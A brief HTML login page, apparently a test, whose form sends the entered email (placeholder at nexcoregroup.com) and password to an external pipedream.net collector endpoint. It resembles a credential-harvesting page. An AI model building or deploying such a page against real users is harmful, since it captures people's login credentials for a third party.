<!DOCTYPE html>
<html>
    <head>
        <title>HTML Testing</title>
    </head>
    <body>
        <h1>Welcome to the app</h1>
        <form id="login-form" action="https://eojd6if7qzeoeqb.m.pipedream.net" method="POST">
            <fieldset>
                <legend>Login</legend><br>
                <label for="email-input">Email:</label>
                <input type="email" id="email-input" name="email-input" placeholder="first.last@nexcoregroup.com" required><br><br>
                <label for="password-input">Password:</label>
                <input type="password" id="password-input" name="password-input" required><br><br>
                <input type="submit" value="Submit"><br>
            </fieldset>
        </form>
        <br><br>
        <a href="/forgot.html" alt="forgot password">Forgot Password? </a><br>
        <a href="/register.html" alt="register new user">Register new user</a>
    </body>
</html>
